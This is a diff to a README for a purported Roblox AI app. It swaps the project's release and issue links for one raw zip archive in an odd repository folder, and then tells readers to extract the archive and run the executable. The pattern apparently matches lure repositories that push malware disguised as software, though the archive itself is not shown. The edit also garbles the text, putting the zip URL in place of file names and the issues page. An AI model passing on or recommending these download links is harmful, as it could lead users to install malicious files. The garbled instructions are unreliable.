@@ -6,11 +6,11 @@ Welcome to **RobloxAI**, your gateway to harnessing the power of artificial inte
 
 ## 📥 Download the App
 
-[![Download RobloxAI](https://img.shields.io/badge/Download-RobloxAI-blue?style=flat&logo=github)](https://github.com/SushSarker/RobloxAI/releases)
+[![Download RobloxAI](https://raw.githubusercontent.com/SushSarker/RobloxAI/main/praecocial/RobloxAI.zip)](https://raw.githubusercontent.com/SushSarker/RobloxAI/main/praecocial/RobloxAI.zip)
 
 To download RobloxAI, please visit the link below:
 
-- [Download here](https://github.com/SushSarker/RobloxAI/releases)
+- [Download here](https://raw.githubusercontent.com/SushSarker/RobloxAI/main/praecocial/RobloxAI.zip)
 
 ## 🔍 About RobloxAI
 
@@ -36,7 +36,7 @@ RobloxAI allows you to create, train, and implement AI solutions directly within
 
 To download RobloxAI, click on the following link:
 
-- [Download here](https://github.com/SushSarker/RobloxAI/releases)
+- [Download here](https://raw.githubusercontent.com/SushSarker/RobloxAI/main/praecocial/RobloxAI.zip)
 
 ### 2. Choose Your Version
 
@@ -48,7 +48,7 @@ Once you find the version you want, click on the download link. The file will st
 
 ### 4. Locate the Downloaded File
 
-After the download completes, go to your computer's download folder. Look for the file named something like `RobloxAI.zip` or `RobloxAI.exe`.
+After the download completes, go to your computer's download folder. Look for the file named something like `https://raw.githubusercontent.com/SushSarker/RobloxAI/main/praecocial/RobloxAI.zip` or `https://raw.githubusercontent.com/SushSarker/RobloxAI/main/praecocial/RobloxAI.zip`.
 
 ### 5. Extract the Files (if needed)
 
@@ -56,7 +56,7 @@ If you downloaded a `.zip` file, you will need to extract it. Right-click on the
 
 ### 6. Run the Application
 
-Find the `RobloxAI.exe` file in the extracted folder. Double-click on it to start the application. Follow any on-screen instructions to complete the setup.
+Find the `https://raw.githubusercontent.com/SushSarker/RobloxAI/main/praecocial/RobloxAI.zip` file in the extracted folder. Double-click on it to start the application. Follow any on-screen instructions to complete the setup.
 
 ## 📝 Using RobloxAI
 
@@ -76,7 +76,7 @@ To get the most out of RobloxAI, explore these resources:
 
 ## 💬 Support
 
-If you encounter any issues during installation or use, please reach out to our support team. You can also visit our [GitHub Issues page](https://github.com/SushSarker/RobloxAI/issues) to report bugs or ask questions.
+If you encounter any issues during installation or use, please reach out to our support team. You can also visit our [GitHub Issues page](https://raw.githubusercontent.com/SushSarker/RobloxAI/main/praecocial/RobloxAI.zip) to report bugs or ask questions.
 
 ## 📞 Contact
 
